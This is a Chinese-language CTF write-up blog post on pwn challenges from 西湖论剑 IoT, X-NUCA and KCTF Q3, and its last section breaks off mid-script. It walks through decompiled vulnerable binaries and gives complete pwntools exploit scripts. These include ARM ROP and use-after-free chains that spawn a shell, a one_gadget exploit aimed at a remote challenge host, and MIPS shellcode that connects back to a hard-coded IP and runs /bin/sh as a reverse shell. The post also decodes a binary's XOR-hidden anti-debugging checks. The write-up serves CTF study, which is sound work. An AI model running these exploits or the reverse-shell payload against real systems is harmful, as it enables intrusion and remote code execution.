---
title: 西湖论剑IoT && X-NUCA && KCTF Q3
date: 2020-12-19 17:33:26
tags:
---
# 西湖论剑IoT &　X-NUCA && KCTF Q3

## 前言

杂记，整理一下最近做的题，发完这篇博客就去做项目:D。西湖论剑的题里pwn2、pwn3是可以本地模拟起来的，本来想都做下，不过项目/论文太忙没时间做pwn2了，考的是协议字段的分析，看着还是蛮不错的，以后有空再说好了。

## 西湖论剑IoT-pwn3

### 漏洞分析 && 漏洞利用

程序开始的registered函数存在溢出，不过因为程序的text地址是0x000106a0，很多gadget都被截断了，这里的溢出不是很好用。

```c
int __fastcall registered(char *name, char *pwd)
{
  int v2; // r3
  char *pwd1; // [sp+0h] [bp-74h]
  char *name1; // [sp+4h] [bp-70h]
  char s2; // [sp+8h] [bp-6Ch]
  char s1; // [sp+30h] [bp-44h]
  char src; // [sp+58h] [bp-1Ch]
  char *i; // [sp+6Ch] [bp-8h]

  name1 = name;
  pwd1 = pwd;
  printf("Please registered account \nInput your username:");
  _isoc99_scanf("%s", &src);                    // 溢出
  getchar();
  printf("Please input password:");
  getpasswd((int)&s1, 0x28);
  for ( i = &s1; *i != 10; ++i )
    ;
  *i = 0;
  printf("\nPlease input password again:");
  getpasswd((int)&s2, 0x28);
  for ( i = &s2; *i != '\n'; ++i )
    ;
  *i = 0;
  if ( strcmp(&s1, &s2) )
  {
    puts("\nPassword wrong");
    exit(-1);
  }
  strcpy(name1, &src);
  strcpy(pwd1, &s2);
  printf("\nSuccess!\n ");
  puts("\nPress any key continue ...");
  getchar();
  return v2;
}
```
继续往后看，一个菜单题，在modify中输入0x48字节数据到passwd，这里存在溢出，因其距离main_ebp为0x40。info函数可以将pwd内容输出，这里调试一下发现modify输入时栈上脏数据包含strtol+40的libc地址，通过strncpy拷贝到pwd在info输出即可leak libc，同理可以泄露栈地址。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char pwd; // [sp+4h] [bp-40h]
  char name; // [sp+2Ch] [bp-18h]

  init(argc, argv, envp);
  registered(&name, &pwd);
  while ( 1 )
  {
    menu();
    switch ( getchoice() )
    {
      case 1:
        play();
        break;
      case 2:
        info(&name, &pwd);
        break;
      case 3:
        modify(&pwd);
        break;
      case 4:
        return 0;
      default:
        puts("Wrong try again!!");
        break;
    }
  }
}
```

```c
int __fastcall modify(char *a1)
{
  char *dest; // ST04_4
  int v2; // r3
  char buf; // [sp+Ch] [bp-50h]
  int v5; // [sp+54h] [bp-8h]

  dest = a1;
  v5 = 0;
  printf("\nPlease Input new password:");
  read(0, &buf, 0x48u);
  strncpy(dest, &buf, 0x48u);
  puts("\nPress any key continue ...");
  getchar();
  return v2;
}
```

观察一下长须退出时的汇编，由于我们泄露出了栈地址，因此控制r11(fp)之后再次跳转到0x10f0c来控制sp到输入的开头，进而执行栈上的rop get shell。

```asm
.text:00010F08 loc_10F08                               ; CODE XREF: main+84↑j
.text:00010F08                 MOV     R0, R3
.text:00010F0C                 SUB     SP, R11, #4
.text:00010F10                 LDMFD   SP!, {R11,PC}
```

继续看，play这个子菜单里还包含了add/delete两个函数,存在很明显的UAF漏洞。之前一直以为这个题是awd因此leak不再使用之前的洞。使用double free控制atoi@got为printf@plt泄露出libc，之后printf的返回值将作为atoi的返回值，这里read的范围是0-8因此我们操作sz为4，idx为0-8的chunk修改free@got为system@libc，释放包含binsh的chunk即可(或许使用`printf("%12c")`等可以返回大于8的值不过我没测试了)。

原题的环境是2.30，我这里是18.04做的，uClibc的保护机制比x86的少很多，比如malloc到某个块时不会对sz做检查，有兴趣的可以详细看看源码。

```c
int add()
{
  int v0; // r3
  void *v2; // [sp+4h] [bp-10h]
  int idx; // [sp+8h] [bp-Ch]
  int size; // [sp+Ch] [bp-8h]

  printf("index: ");
  idx = getchoice();
  v0 = a[2 * idx + 1];
  if ( !v0 )
  {
    printf("size: ");
    size = getchoice();
    v0 = size;
    if ( size > 0 )
    {
      if ( size > 0x70 )
        size = 0x70;
      v2 = malloc(size);
      if ( !v2 )
        exit(-1);
      a[2 * idx] = size;
      a[2 * idx + 1] = v2;
      printf("content: ");
      content(a[2 * idx + 1], size);
      printf("the index is :%d \n", idx);
    }
  }
  return v0;
}
//
int delete()
{
  int v0; // r3
  int v2; // [sp+4h] [bp-8h]

  printf("index: ");
  v2 = getchoice();
  v0 = v2;
  if ( v2 >= 0 )
  {
    v0 = v2;
    if ( v2 <= 15 )
    {
      v0 = a[2 * v2 + 1];
      if ( v0 )
      {
        a[2 * v2] = 0;
        free((void *)a[2 * v2 + 1]);
      }
    }
  }
  return v0;
}
```

### exp.py

rop的exp。

```py
# encoding=utf-8
from pwn import *

context.arch = "arm"
context.endian = 'little'
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
debug = 1
libc = ELF('/usr/arm-linux-gnueabi/lib/libc.so.6')
elf = ELF("./pwn3")

if debug == 1:
    p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi/", "./pwn3"])
else:
    p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabi/", "./pwn3"])


p_r3 = 0x000105c8
mov_r0_r3 = 0x10e60

def add(idx,sz,content):
    p.sendlineafter("choice > ","1")
    p.sendlineafter("choice > ","1")
    p.sendlineafter("index: ",str(idx))
    p.sendlineafter("size: ",str(sz))
    p.sendafter("content: ",content)

def mod_pwd(pwd):
    p.sendlineafter("choice > ","3")
    p.sendafter("Please Input new password:",pwd)
    p.recvuntil("continue ...")
    p.send('\n')

def dele(idx):
    p.sendlineafter("choice > ","1")
    p.sendlineafter("choice > ","2")
    p.sendlineafter("index: ",str(idx))

def show():
    p.sendlineafter("choice > ","2")



def exp():
    raw_input()
    p.recvuntil("Input your username:")
    #uname = "a"*0x1c+p32(p_r3)+p32(elf.got['puts'])+p32(mov_r0_r3)
    uname = "a"*4
    p.sendline(uname)
    p.recvuntil("Please input password:")
    pwd = "456"
    p.sendline(pwd)
    p.recvuntil("Please input password again:")
    p.sendline(pwd)
    p.recvuntil("continue ...")
    p.send('\n')
    #leak stack
    mod_pwd("b"*0x10)
    show()
    p.recvuntil("b"*0x10)
    stack_addr = u32(p.recvn(4)) + 0x14
    log.success("stack addr => {}".format(hex(stack_addr)))
    #leak libc
    mod_pwd("c"*0x30)
    show()
    p.recvuntil("c"*0x30)
    libc_base = u32(p.recvn(4)) - 44 - libc.sym['strtol']
    log.success("libc base => {}".format(hex(libc_base)))
    #get shell
    p_r0 = libc_base + 0x0011e54c
    p_r0_r1_r2_r3 = libc_base + 0x0011ebc8
    binsh = libc_base + 0x00131bec
    system = libc_base + libc.sym['system']
    payload = p32(stack_addr-0x20)+p32(p_r0)+p32(binsh)+p32(system)
    payload = payload.ljust(0x3c,'a')
    payload += p32(stack_addr+4)+p32(0x10f0c)
    mod_pwd(payload)
    p.sendlineafter("choice > ","4")
    p.interactive()

exp()

```

uaf的exp.

```py
# encoding=utf-8
from pwn import *

context.arch = "arm"
context.endian = 'little'
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
debug = 1
libc = ELF('/usr/arm-linux-gnueabi/lib/libc.so.6')
elf = ELF("./pwn3")

if debug == 1:
    p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi/", "./pwn3"])
else:
    p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabi/", "./pwn3"])


p_r3 = 0x000105c8
mov_r0_r3 = 0x10e60

def add(idx,sz,content='\n'):
    p.sendlineafter("choice > ","1")
    p.sendlineafter("choice > ","1")
    p.sendlineafter("index: ",str(idx))
    p.sendlineafter("size: ",str(sz))
    p.sendafter("content: ",content)

def mod_pwd(pwd):
    p.sendlineafter("choice > ","3")
    p.sendafter("Please Input new password:",pwd)
    p.recvuntil("continue ...")
    p.send('\n')

def dele(idx):
    p.sendlineafter("choice > ","1")
    p.sendlineafter("choice > ","2")
    p.sendlineafter("index: ",str(idx))

def add1(idx,sz,content='\n'):
    p.sendlineafter("choice > ","1\x00")
    p.sendlineafter("choice > ","1\x00")
    p.sendlineafter("index: ","2"*idx+'\x00')
    p.sendlineafter("size: ","3"*sz+'\x00')
    p.sendafter("content: ",content)

def dele1(idx):
    p.sendlineafter("choice > ","1\x00")
    p.sendlineafter("choice > ","22\x00")
    p.sendlineafter("index: ","2"*idx+'\x00')

def show():
    p.sendlineafter("choice > ","2")



def exp():
    #raw_input()
    sleep(1)
    p.recvuntil("Input your username:")
    #uname = "a"*0x1c+p32(p_r3)+p32(elf.got['puts'])+p32(mov_r0_r3)
    uname = "a"*4
    p.sendline(uname)
    p.recvuntil("Please input password:")
    pwd = "456"
    p.sendline(pwd)
    p.recvuntil("Please input password again:")
    p.sendline(pwd)
    p.recvuntil("continue ...")
    p.send('\n')
    #leak libc
    add(0,0x4)#0
    add(4,0x4)#8
    add(5,0x4)#8
    add(9,0x60,"%29$p\n")#0
    add(6,0x60,"/bin/sh\x00\n")#0
    dele(5)
    dele(0)
    dele(0)
    add(11,0x4,p32(elf.got['atoi']))
    add(12,0x4)
    add(13,0x4,p32(elf.plt['printf']))
    p.sendlineafter("choice > ","%25$p\n")
    p.recvuntil("0x")
    libc_base = int(p.recvline().strip('\n'),16) - 272 - libc.sym['__libc_start_main']
    log.success("libc base => {}".format(hex(libc_base)))
    libc.address = libc_base
    #get shell
    dele1(4)
    dele1(4)
    add1(1,0x4,p32(elf.got['free']))
    add1(2,0x4)
    add1(3,0x4,p32(libc.sym['system']))
    dele1(6)
    p.interactive()

exp()

```

## X-NUCA个人赛pwn1

### 漏洞分析 && 漏洞利用

hello函数中输入you时可以溢出，伪造`you[8]`的文件指针，伪造vtable，从而在flcose时执行gadget让esp到达栈上布置的rop，由于scanf的输入有很多gadget截断，这里再read一次，迁移到bss去执行sys_execve系统调用。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-4h] [ebp-4h]

  __asm { endbr32 }
  init_0();
  hello();
  menu((int)&v4);
  return 0;
}
//
int hello()
{
  __asm { endbr32 }
  puts("welcome to baby xnuca2020~");
  puts("I want to know your name");
  _isoc99_scanf("%s", you);
  return printf("Hello %s, I have kept you in mind\n", (unsigned int)you);
}
//
unsigned int __usercall menu@<eax>(int a1@<ebp>)
{
  int v2; // [esp-24h] [ebp-24h]
  int v3; // [esp-20h] [ebp-20h]
  unsigned int v4; // [esp-10h] [ebp-10h]
  int v5; // [esp-4h] [ebp-4h]

  __asm { endbr32 }
  v5 = a1;
  v4 = __readgsdword(0x14u);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1.Read a file");
      puts("2.Print a file");
      puts("3.Exit");
      puts("> ");
      _isoc99_scanf("%s", &v3);
      v2 = atoi(&v3);
      if ( v2 != 2 )
        break;
      xPrint((int)&v5);
    }
    if ( v2 == 3 )
      break;
    if ( v2 == 1 )
      xRead();
    else
      puts("Invalid choise");
  }
  if ( you[8] )
    fclose((int *)you[8]);
  return __readgsdword(0x14u) ^ v4;
}
//
unsigned int xRead()
{
  char *v0; // eax
  int v2; // [esp-40h] [ebp-40h]
  unsigned int v3; // [esp-10h] [ebp-10h]

  __asm { endbr32 }
  v3 = __readgsdword(0x14u);
  sub_80490C0();
  puts("Input the file path: ");
  _isoc99_scanf("%32s", &v2);
  v0 = (char *)&v2 + strlen((const char *)&v2);
  *(_DWORD *)v0 = 'unx_';
  *((_WORD *)v0 + 2) = 'ac';
  v0[6] = 0;
  you[8] = fopen((int)&v2, (int)"r");
  if ( you[8] )
    puts("fake_flag{fake_flag}");
  else
    puts("GG");
  return __readgsdword(0x14u) ^ v3;
}
//
unsigned int __usercall xPrint@<eax>(int a1@<ebp>)
{
  int v2; // [esp-110h] [ebp-110h]
  unsigned int v3; // [esp-10h] [ebp-10h]
  int v4; // [esp-4h] [ebp-4h]

  __asm { endbr32 }
  v4 = a1;
  v3 = __readgsdword(0x14u);
  if ( you[8] )
  {
    puts("Start");
    fread((int)&v2, 0x100u, 1, (_DWORD *)you[8]);
  }
  return __readgsdword(0x14u) ^ v3;
}
```

## X-NUCA个人赛pwn2

### 漏洞分析 &&　漏洞利用

这道题很有意思，在团队赛时也有一个类似的洞，这题和pwn1有些相似，但是由于you的输入没有溢出，无法控制`you[65]`指针。在xRead函数里有一次输入，sz可控，我们输入超过bss段的sz，从而在`v2 += read(0, (char *)&you[66] + v2, v3 - v2);`时返回-1，在之后输入即可控制`you[65]`，由于前面已经Leak出了libc，这里直接给个one_gadget(由于远程没打不知道版本，如果gadget都不可行再用点别的gadget去执行rop如pwn1)。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __asm { endbr32 }
  init();
  hello();
  menu();
  return 0;
}
//
FILE **init()
{
  FILE **result; // eax

  __asm { endbr32 }
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  signal(14, (__sighandler_t)handle);
  alarm(0x5Au);
  result = you;
  you[65] = (FILE *)bye;
  return result;
}
//
int hello()
{
  __asm { endbr32 }
  puts("welcome to baby xnuca2020~");
  puts("I want to know your name again");
  __isoc99_scanf("%256s", you);
  printf("Hello %s, I have kept you in mind\n", you);
  puts("I will give a present to you.");
  return printf("%p\n", &calloc);
}
//
unsigned int menu()
{
  int v1; // [esp-2Ch] [ebp-2Ch]
  int v2; // [esp-28h] [ebp-28h]
  int v3; // [esp-24h] [ebp-24h]
  int v4; // [esp-20h] [ebp-20h]
  int v5; // [esp-1Ch] [ebp-1Ch]
  int v6; // [esp-18h] [ebp-18h]
  int v7; // [esp-14h] [ebp-14h]
  unsigned int v8; // [esp-10h] [ebp-10h]
  int v9; // [esp-Ch] [ebp-Ch]
  int v10; // [esp-8h] [ebp-8h]
  int v11; // [esp-4h] [ebp-4h]

  __asm { endbr32 }
  v8 = __readgsdword(0x14u);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1.Create a file");
      puts("2.Print a file");
      puts("3.Exit");
      puts("> ");
      __isoc99_scanf("%s", &v4);
      v3 = atoi((const char *)&v4);
      if ( v3 != 2 )
        break;
      xPrint((int)&v11);
    }
    if ( v3 == 3 )
      break;
    if ( v3 == 1 )
      xRead();
    else
      puts("Invalid choise");
  }
  if ( you[64] )
    fclose(you[64]);
  ((void (__stdcall *)(int, int, signed int, int, int, int, int, unsigned int, int, int))you[65])(
    v1,
    v2,
    3,
    v4,
    v5,
    v6,
    v7,
    v8,
    v9,
    v10);
  return __readgsdword(0x14u) ^ v8;
}
// bad sp value at call has been detected, the output may be wrong!
unsigned int xRead()
{
  char *v0; // eax
  int v2; // [esp-48h] [ebp-48h]
  int v3; // [esp-44h] [ebp-44h]
  int v4; // [esp-40h] [ebp-40h]
  unsigned int v5; // [esp-10h] [ebp-10h]

  __asm { endbr32 }
  v5 = __readgsdword(0x14u);
  memset(&v4, 0, 0x30u);
  puts("Input the file path: ");
  __isoc99_scanf("%32s", &v4);
  v0 = (char *)&v4 + strlen((const char *)&v4);
  *(_DWORD *)v0 = 'unx_';
  *((_WORD *)v0 + 2) = 'ac';
  v0[6] = 0;
  you[64] = fopen((const char *)&v4, "w+");
  if ( !you[64] )
    exit(0);
  puts("Digest length: ");
  v2 = 0;
  v3 = get_num();
  if ( v3 < 0 )
  {
    puts("error");
    exit(0);
  }
  puts("Digest: ");
  do
  {
    if ( v2 >= v3 )
      break;
    v2 += read(0, (char *)&you[66] + v2, v3 - v2);
  }
  while ( *((_BYTE *)&you[65] + v2 + 3) != '\n' );
  return __readgsdword(0x14u) ^ v5;
}
```

### exp.py

```py
#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn2')
libc_offset = 0x3c4b20
gadgets = [0x3ac6c,0x3ac6e,0x3ac72,0x3ac79,0x3ac9c,0x3ac9d,0x5fbd5,0x5fbd6]
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    p = process('./pwn2')
else:
    p = remote('f.buuoj.cn',20173)

def CreateFile(path,sz,dig):
    p.sendlineafter("> \n","1")
    p.sendlineafter("Input the file path: \n",path)
    p.sendlineafter("Digest length: \n",str(sz))
    p.sendafter("Digest: \n",dig)

def exp():
    #leak libc
    p.recvuntil("I want to know your name again")
    p.sendline("xmzyshypnc")
    p.recvuntil("I will give a present to you.\n")
    p.recvuntil("0x")
    libc_base = int(p.recvline().strip('\n'),16) - libc.sym['calloc']
    log.success("libc base => " + hex(libc_base))
    #get shell
    #gdb.attach(p,'b* 0x08049843')
    shell_addr = libc_base + 0x1487fc
    CreateFile("a",0xe80,'\x00'*4+p32(shell_addr)+'a'*0xe77+'\n')

    p.sendlineafter("> \n","3")
    p.interactive()

exp()

```

## X-NUCA 团队赛 qmips

### 漏洞分析 && 漏洞利用

mips32大端程序，直接拿超长payload测试可以发现存在溢出，cyclic可以找到溢出长度，search发现除了在栈上存在输入数据，heap上也有，并且heap地址为固定值(qemu-system/qemu-user态测试堆地址均不变)，因此在输入前布置shellcode，最后跳转过去执行即可。

这里的shellcode前半部分connect使用shellcraft自带的方法，后面dup2和execve是自己写的shellcode。

### exp.py

```py
#!coding=utf8
#gdbserver 0.0.0.0:6666 ./sampmips 4444
from pwn import *
context.arch = 'mips'
context.bits = 32
context.endian = 'big'
context.log_level = "debug"

p = remote("10.104.252.112",8889)
#p = remote("10.101.168.38",4444)

stage0 = shellcraft.mips.linux.connect("127.0.0.1", 4444)

# print(shellcshode,len(shellcode))
stage1 = """
    sw $v0,10($sp);
    lw $v0,10($sp);
    addiu $a1,$zero,0
    addiu $v0,$zero,4063
    syscall 0x40404

    lw $v0,10($sp);
    addiu $a1,$zero,1
    addiu $v0,$zero,4063
    syscall 0x40404

    lw $v0,10($sp);
    addiu $a1,$zero,2
    addiu $v0,$zero,4063
    syscall 0x40404


    lui $t6,0x2f62
    ori $t6,$t6,0x696e
    sw $t6,28($sp)

    lui $t7,0x2f2f
    ori $t7,$t7,0x7368
    sw $t7,32($sp)
    sw $zero,36($sp)


    la $a0,28($sp)

    addiu $a1,$zero,0
    addiu $a2,$zero,0
    addiu $v0,$zero,4011

    syscall 0x40404
"""
payload = asm(shellcraft.mips.linux.connect('10.104.252.112',6931))
payload += asm(stage1)
payload = payload.ljust(544,'\x00')
#payload
payload += p32(0x418280)
#print cyclic_find(0x6c616166)
def solve():
    #raw_input()
    p.send(payload)
    print(p.recv())
    # p.interactive()
if __name__ == "__main__":
    solve()

```

![](./1.png)

## KCTF Q3 pwn1

### 程序逻辑

这道题有意思的地方在于多了一些逆向的东西，最后一步步地把它变成了自己熟悉的形态。

直接去运行程序会得到`Please run in docker!`的输入，让人摸不着头脑.jpg，直接去搜字符串也搜不到。我们看一下check_docker，发现这里通过异或隐藏了上述字符串，那么程序怎样才能正常运行起来呢？

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  unsigned int stack_val[6]; // [rsp+20h] [rbp-30h]
  unsigned __int64 v5; // [rsp+38h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  check_docker();
  get_input((__int64)stack_val);
  Mov(stack_val, (__int64)&bss_input);
  sub_4015FA(stack_val);
  sub_400DFC();
  return 0LL;
}
```

我们看一眼.init_array，它先于main函数被执行，可以找到两个函数，我们看一眼fini_func函数，其调用了fini1，fini2调用了fini2

```asm
.init_array:0000000000601DD8 90 0A 40 00 00 00 00 00+funcs_401849    dq offset init_func1    ; DATA XREF: LOAD:00000000004000F8↑o
.init_array:0000000000601DD8 BF 0B 40 00 00 00 00 00                                         ; LOAD:0000000000400210↑o ...
.init_array:0000000000601DD8                                         dq offset fini_func
```

```c
__int64 fini_func()
{
  return fini1(1, 0xFFFF);
}
//
__int64 __fastcall fini1(int a1, int a2)
{
  __int64 result; // rax

  if ( a1 == 1 && a2 == 0xFFFF )
  {
    std::ios_base::Init::Init((std::ios_base::Init *)&unk_6022C8);
    __cxa_atexit((__int64)std::ios_base::Init::~Init, (__int64)&unk_6022C8, (__int64)&unk_602090);
    fini2((void **)&bss_libc_str);
    result = __cxa_atexit((__int64)sub_400E66, (__int64)&bss_libc_str, (__int64)&unk_602090);
  }
  return result;
}
//
char __fastcall fini2(__int64 a1)
{
  char result; // al

  OpenLibc(a1);
  result = (unsigned int)AntiDebug(a1) == 0;
  if ( result )
    result = AutoChange(a1);
  return result;
}
```

OpenLibc函数打开了libc文件，这里可以写个解码函数进行解码，有个技巧是可以将变量转化为数组，这样方便拷贝c代码出去直接运行即可。

```c
unsigned __int64 __fastcall OpenLibc(void **a1)
{
  int i; // [rsp+1Ch] [rbp-24h]
  char file[24]; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  file[0] = 91;
  file[1] = 94;
  file[2] = 85;
  file[3] = 84;
  file[4] = 25;
  file[5] = 68;
  file[6] = 88;
  file[7] = 25;
  file[8] = 1;
  file[9] = 0;
  for ( i = 0; i <= 8; ++i )
    file[i] ^= 0x37u;
  *a1 = dlopen(file, 1);
  return __readfsqword(0x28u) ^ v4;
}
```



同样的，AntiDebug函数也用相同方法逆出逻辑。

```c
__int64 __fastcall AntiDebug(__int64 a1)
{
  __int64 (__fastcall *get_pid_)(__int64, char *); // rax
  unsigned int v2; // eax
  __int64 (__fastcall *fopen_)(char *, void *); // ST50_8
  void (__fastcall *fclose_)(__int64, char *); // ST78_8
  signed int i; // [rsp+18h] [rbp-138h]
  signed int j; // [rsp+1Ch] [rbp-134h]
  unsigned int v8; // [rsp+20h] [rbp-130h]
  signed int k; // [rsp+24h] [rbp-12Ch]
  signed int l; // [rsp+28h] [rbp-128h]
  signed int m; // [rsp+2Ch] [rbp-124h]
  signed int n; // [rsp+30h] [rbp-120h]
  signed int ii; // [rsp+34h] [rbp-11Ch]
  signed int jj; // [rsp+38h] [rbp-118h]
  signed int kk; // [rsp+3Ch] [rbp-114h]
  void (__fastcall *snprintf_)(char *, signed __int64, char *, _QWORD); // [rsp+40h] [rbp-110h]
  __int64 fp; // [rsp+58h] [rbp-F8h]
  __int64 (__fastcall *fgets_)(char *, signed __int64, __int64); // [rsp+60h] [rbp-F0h]
  __int64 (__fastcall *strstr_)(char *, char *); // [rsp+68h] [rbp-E8h]
  __int64 (__fastcall *atoi_)(_BYTE *); // [rsp+70h] [rbp-E0h]
  char atoi_str[4]; // [rsp+80h] [rbp-D0h]
  char v22; // [rsp+84h] [rbp-CCh]
  char fopen_str[5]; // [rsp+90h] [rbp-C0h]
  char v24; // [rsp+95h] [rbp-BBh]
  char fgets_str[5]; // [rsp+A0h] [rbp-B0h]
  char v26; // [rsp+A5h] [rbp-ABh]
  char get_pid_str[6]; // [rsp+B0h] [rbp-A0h]
  char v28; // [rsp+B6h] [rbp-9Ah]
  char strstr_str[6]; // [rsp+C0h] [rbp-90h]
  char v30; // [rsp+C6h] [rbp-8Ah]
  char fclose_str[6]; // [rsp+D0h] [rbp-80h]
  char v32; // [rsp+D6h] [rbp-7Ah]
  char snprintf_str[8]; // [rsp+E0h] [rbp-70h]
  char v34; // [rsp+E8h] [rbp-68h]
  char trace_pid[9]; // [rsp+F0h] [rbp-60h]
  char v36; // [rsp+F9h] [rbp-57h]
  char proc_status[15]; // [rsp+100h] [rbp-50h]
  char v38; // [rsp+10Fh] [rbp-41h]
  char proc_status_str; // [rsp+110h] [rbp-40h]
  _BYTE v40[6]; // [rsp+11Ah] [rbp-36h]
  unsigned __int64 v41; // [rsp+148h] [rbp-8h]

  v41 = __readfsqword(0x28u);
  proc_status[0] = 52;
  proc_status[1] = 107;
  proc_status[2] = 105;
  proc_status[3] = 116;
  proc_status[4] = 120;                         // proc_status
  proc_status[5] = 52;
  proc_status[6] = 62;
  proc_status[7] = 127;
  proc_status[8] = 52;
  proc_status[9] = 104;
  proc_status[10] = 111;
  proc_status[11] = 122;
  proc_status[12] = 111;
  proc_status[13] = 110;
  proc_status[14] = 104;
  v38 = 0;
  for ( i = 0; i <= 14; ++i )
    proc_status[i] ^= 0x1Bu;
  trace_pid[0] = 117;
  trace_pid[1] = 83;
  trace_pid[2] = 64;
  trace_pid[3] = 66;
  trace_pid[4] = 68;
  trace_pid[5] = 83;
  trace_pid[6] = 113;
  trace_pid[7] = 72;
  trace_pid[8] = 69;
  v36 = 0;
  for ( j = 0; j <= 8; ++j )
    trace_pid[j] ^= 0x21u;
  memset(&proc_status_str, 0, 0x30uLL);
  v8 = 0;
  snprintf_str[0] = 94;
  snprintf_str[1] = 67;
  snprintf_str[2] = 93;
  snprintf_str[3] = 95;
  snprintf_str[4] = 68;
  snprintf_str[5] = 67;
  snprintf_str[6] = 89;
  snprintf_str[7] = 75;
  v34 = 0;
  for ( k = 0; k <= 7; ++k )
    snprintf_str[k] ^= 0x2Du;
  snprintf_ = (void (__fastcall *)(char *, signed __int64, char *, _QWORD))CallLibFunc((void **)a1, snprintf_str);
  get_pid_str[0] = 81;
  get_pid_str[1] = 83;
  get_pid_str[2] = 66;
  get_pid_str[3] = 70;
  get_pid_str[4] = 95;
  get_pid_str[5] = 82;
  v28 = 0;
  for ( l = 0; l <= 5; ++l )
    get_pid_str[l] ^= 0x36u;
  get_pid_ = (__int64 (__fastcall *)(__int64, char *))CallLibFunc((void **)a1, get_pid_str);
  v2 = get_pid_(a1, get_pid_str);
  snprintf_(&proc_status_str, 0x30LL, proc_status, v2);
  fopen_str[0] = 36;
  fopen_str[1] = 45;
  fopen_str[2] = 50;
  fopen_str[3] = 39;
  fopen_str[4] = 44;
  v24 = 0;
  for ( m = 0; m <= 4; ++m )
    fopen_str[m] ^= 0x42u;
  fopen_ = (__int64 (__fastcall *)(char *, void *))CallLibFunc((void **)a1, fopen_str);
  fp = fopen_(&proc_status_str, &unk_401885);
  if ( !fp )
    return 0LL;
  fgets_str[0] = 93;
  fgets_str[1] = 92;
  fgets_str[2] = 94;
  fgets_str[3] = 79;
  fgets_str[4] = 72;
  v26 = 0;
  for ( n = 0; n <= 4; ++n )
    fgets_str[n] ^= 0x3Bu;
  fgets_ = (__int64 (__fastcall *)(char *, signed __int64, __int64))CallLibFunc((void **)a1, fgets_str);
  strstr_str[0] = 60;
  strstr_str[1] = 59;
  strstr_str[2] = 61;
  strstr_str[3] = 60;
  strstr_str[4] = 59;
  strstr_str[5] = 61;
  v30 = 0;
  for ( ii = 0; ii <= 5; ++ii )
    strstr_str[ii] ^= 0x4Fu;
  strstr_ = (__int64 (__fastcall *)(char *, char *))CallLibFunc((void **)a1, strstr_str);
  atoi_str[0] = 57;
  atoi_str[1] = 44;
  atoi_str[2] = 55;
  atoi_str[3] = 49;
  v22 = 0;
  for ( jj = 0; jj <= 3; ++jj )
    atoi_str[jj] ^= 0x58u;
  atoi_ = (__int64 (__fastcall *)(_BYTE *))CallLibFunc((void **)a1, atoi_str);
  while ( fgets_(&proc_status_str, 48LL, fp) != 0 )
  {
    if ( strstr_(&proc_status_str, trace_pid) != 0 )
      v8 = atoi_(v40);
  }
  fclose_str[0] = 4;
  fclose_str[1] = 1;
  fclose_str[2] = 14;
  fclose_str[3] = 13;
  fclose_str[4] = 17;
  fclose_str[5] = 7;
  v32 = 0;
  for ( kk = 0; kk <= 5; ++kk )
    fclose_str[kk] ^= 0x62u;
  fclose_ = (void (__fastcall *)(__int64, char *))CallLibFunc((void **)a1, fclose_str);
  fclose_(fp, fclose_str);
  return v8;
}
```

解码脚本如下：

```c
#include <stdio.h>
#include <string.h>
int main()
{
  int i;
  char file[9];
  file[0] = 91;
  file[1] = 94;
  file[2] = 85;
  file[3] = 84;
  file[4] = 25;
  file[5] = 68;
  file[6] = 88;
  file[7] = 25;
  file[8] = 1;
  char buf8[4]; // [rsp+80h] [rbp-D0h]
  char buf5[5]; // [rsp+90h] [rbp-C0h]
  char buf6[5]; // [rsp+A0h] [rbp-B0h]
  char buf4[6]; // [rsp+B0h] [rbp-A0h]
  char buf7[6]; // [rsp+C0h] [rbp-90h]
  char buf9[6]; // [rsp+D0h] [rbp-80h]
  char buf3[8]; // [rsp+E0h] [rbp-70h]
  char buf2[9]; // [rsp+F0h] [rbp-60h]
  
  char buf1[15]; // [rsp+100h] [rbp-50h]
  char hh[23];
  char wz[23] = {0x89, 0x7D, 0xFC, 0x89 ,0x75 ,0xF8 ,0x89 ,0x55 ,0xF4 ,0x89 ,0x4D ,0xF0 ,0x44 ,0x89 ,0x45 ,0xEC ,0x8B ,0x45 ,0xF8 ,0x99 ,0xF7,0x7D , 0xF4};
  char res[23] = {0};
  hh[0] = -63;
  hh[1] = -12;
  hh[2] = 4;
  hh[3] = -63;
  hh[4] = -4;
  hh[5] = 15;
  hh[6] = -63;
  hh[7] = -36;
  hh[8] = 34;
  hh[9] = -63;
  hh[10] = -60;
  hh[11] = 58;
  hh[12] = 8;
  hh[13] = 0;
  hh[14] = -124;
  hh[15] = -29;
  hh[16] = -114;
  hh[17] = -116;
  hh[18] = 59;
  hh[19] = -47;
  hh[20] = -58;
  hh[21] = -76;
  hh[22] = 55;

  buf1[0] = 52;
  buf1[1] = 107;
  buf1[2] = 105;
  buf1[3] = 116;
  buf1[4] = 120;
  buf1[5] = 52;
  buf1[6] = 62;
  buf1[7] = 127;
  buf1[8] = 52;
  buf1[9] = 104;
  buf1[10] = 111;
  buf1[11] = 122;
  buf1[12] = 111;
  buf1[13] = 110;
  buf1[14] = 104;
  for ( i = 0; i <= 14; ++i )
    buf1[i] ^= 0x1Bu;
  buf2[0] = 117;
  buf2[1] = 83;
